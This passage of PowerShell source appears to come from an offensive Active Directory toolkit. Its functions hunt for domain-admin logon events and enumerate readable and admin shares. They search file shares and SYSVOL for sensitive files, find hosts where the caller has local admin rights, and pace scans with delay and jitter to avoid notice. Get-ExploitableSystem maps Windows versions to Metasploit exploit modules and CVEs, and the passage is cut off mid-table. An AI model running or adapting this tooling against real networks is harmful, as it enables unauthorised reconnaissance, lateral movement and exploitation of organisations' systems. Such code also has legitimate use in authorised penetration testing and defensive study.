                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $ProcessName, $TargetUsers, $Credential
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user/process found, returning early"
                    return
                }
            }
        }
    }
}


function Invoke-EventHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String[]]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Int32]
        $SearchDays = 3,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-EventHunter"

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            
            $TargetDomains = @( (Get-NetDomain -Credential $Credential).name )
        }

        
        
        
        
        

        if(!$ComputerName) { 
            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for domain controllers"
                    $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController -Credential $Credential | ForEach-Object { $_.dnshostname}
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }

        
        
        
        
        

        
        $TargetUsers = @()

        
        if($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }
        
        elseif($UserName) {
            
            $TargetUsers = $UserName | ForEach-Object {$_.ToLower()}
            if($TargetUsers -isnot [System.Array]) {
                $TargetUsers = @($TargetUsers)
            }
        }
        
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController -Credential $Credential | ForEach-Object {
                    $_.MemberName
                }
            }
        }

        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays, $Credential)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                if($Credential) {
                    Get-UserEvent -ComputerName $ComputerName -Credential $Credential -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                        
                        $TargetUsers -contains $_.UserName
                    }
                }
                else {
                    Get-UserEvent -ComputerName $ComputerName -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                        
                        $TargetUsers -contains $_.UserName
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
                'Credential' = $Credential
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $(-not $NoPing), $TargetUsers, $SearchDays, $Credential
            }
        }

    }
}


function Invoke-ShareFinder {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
 
        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-ShareFinder with delay of $Delay"

        
        [String[]] $ExcludedShares = @('')

        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + "PRINT$"
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + "IPC$"
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        
        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }
                
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
        
            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw "No hosts found!"
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                $Shares = Get-NetShare -ComputerName $ComputerName
                ForEach ($Share in $Shares) {
                    Write-Verbose "[*] Server share: $Share"
                    $NetName = $Share.shi1_netname
                    $Remark = $Share.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+$NetName

                    
                    if (($NetName) -and ($NetName.trim() -ne '')) {
                        
                        if($CheckAdmin) {
                            if($NetName.ToUpper() -eq "ADMIN$") {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$ComputerName\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Verbose "Error accessing path $Path : $_"
                                }
                            }
                        }
                        
                        elseif ($ExcludedShares -NotContains $NetName.ToUpper()) {
                            
                            if($CheckShareAccess) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    "\\$ComputerName\$NetName `t- $Remark"
                                }
                                catch {
                                    Write-Verbose "Error accessing path $Path : $_"
                                }
                            }
                            else {
                                "\\$ComputerName\$NetName `t- $Remark"
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
        
    }
}


function Invoke-FileFinder {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [Alias('Terms')]
        [String[]]
        $SearchTerms, 

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [Switch]
        $SearchForest,

        [Switch]
        $SearchSYSVOL,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Switch]
        $UsePSDrive
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-FileFinder with delay of $Delay"

        $Shares = @()

        
        [String[]] $ExcludedShares = @("C$", "ADMIN$")

        
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("ADMIN$")
            }
        }

        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @("C$")
            }
        }

        
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        
        if ($TermList) {
            ForEach ($Term in Get-Content -Path $TermList) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    $SearchTerms += $Term
                }
            }
        }

        
        if($ShareList) {
            ForEach ($Item in Get-Content -Path $ShareList) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {
                    
                    $Share = $Item.Split("`t")[0]
                    $Shares += $Share
                }
            }
        }
        else {
            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }

            if(!$ComputerName) {

                if($Domain) {
                    $TargetDomains = @($Domain)
                }
                elseif($SearchForest) {
                    
                    $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
                }
                else {
                    
                    $TargetDomains = @( (Get-NetDomain).name )
                }

                if($SearchSYSVOL) {
                    ForEach ($Domain in $TargetDomains) {
                        $DCSearchPath = "\\$Domain\SYSVOL\"
                        Write-Verbose "[*] Adding share search path $DCSearchPath"
                        $Shares += $DCSearchPath
                    }
                    if(!$SearchTerms) {
                        
                        $SearchTerms = @('.vbs', '.bat', '.ps1')
                    }
                }
                else {
                    [array]$ComputerName = @()

                    ForEach ($Domain in $TargetDomains) {
                        Write-Verbose "[*] Querying domain $Domain for hosts"
                        $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                    }

                    
                    $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
                    if($($ComputerName.Count) -eq 0) {
                        throw "No hosts found!"
                    }
                }
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ExcludedShares, $SearchTerms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive)

            Write-Verbose "ComputerName: $ComputerName"
            Write-Verbose "ExcludedShares: $ExcludedShares"
            $SearchShares = @()

            if($ComputerName.StartsWith("\\")) {
                
                $SearchShares += $ComputerName
            }
            else {
                
                $Up = $True
                if($Ping) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($Up) {
                    
                    $Shares = Get-NetShare -ComputerName $ComputerName
                    ForEach ($Share in $Shares) {

                        $NetName = $Share.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+$NetName

                        
                        if (($NetName) -and ($NetName.trim() -ne '')) {

                            
                            if ($ExcludedShares -NotContains $NetName.ToUpper()) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $SearchShares += $Path
                                }
                                catch {
                                    Write-Verbose "[!] No access to $Path"
                                }
                            }
                        }
                    }
                }
            }

            ForEach($Share in $SearchShares) {
                $SearchArgs =  @{
                    'Path' = $Share
                    'SearchTerms' = $SearchTerms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                }

                Find-InterestingFile @SearchArgs
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'SearchTerms' = $SearchTerms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
            }

            
            if($Shares) {
                
                Invoke-ThreadedFunction -ComputerName $Shares -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
            }
            else {
                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
            }
        }

        else {
            if($Shares){
                $ComputerName = $Shares
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            $ComputerName | Where-Object {$_} | ForEach-Object {
                Write-Verbose "Computer: $_"
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $_ ($Counter of $($ComputerName.count))"

                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $_, $False, $ExcludedShares, $SearchTerms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive                
            }
        }
    }
}


function Find-LocalAdminAccess {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Find-LocalAdminAccess with delay of $Delay"

        
        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) {
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
        
            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping)

            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                $Access = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                if ($Access.IsAdmin) {
                    $ComputerName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False
            }
        }
    }
}


function Get-ExploitableSystem {

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem = '*',

        [String]
        $ServicePack = '*',

        [String]
        $Filter,

        [Switch]
        $Ping,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

    
    $TableAdsComputers = New-Object System.Data.DataTable 
    $Null = $TableAdsComputers.Columns.Add('Hostname')       
    $Null = $TableAdsComputers.Columns.Add('OperatingSystem')
    $Null = $TableAdsComputers.Columns.Add('ServicePack')
    $Null = $TableAdsComputers.Columns.Add('LastLogon')

    Get-NetComputer -FullData @PSBoundParameters | ForEach-Object {

        $CurrentHost = $_.dnshostname
        $CurrentOs = $_.operatingsystem
        $CurrentSp = $_.operatingsystemservicepack
        $CurrentLast = $_.lastlogon
        $CurrentUac = $_.useraccountcontrol

        $CurrentUacBin = [convert]::ToString($_.useraccountcontrol,2)

        
        $DisableOffset = $CurrentUacBin.Length - 2
        $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

        
        if ($CurrentDisabled  -eq 0) {
            
            $Null = $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast)
        }
    }

    
    Write-Verbose "[*] Loading exploit list for critical missing patches..."

    
    
    

    
    $TableExploits = New-Object System.Data.DataTable 
    $Null = $TableExploits.Columns.Add('OperatingSystem') 
    $Null = $TableExploits.Columns.Add('ServicePack')
    $Null = $TableExploits.Columns.Add('MsfModule')  
    $Null = $TableExploits.Columns.Add('CVE')
    
    
    $Null = $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
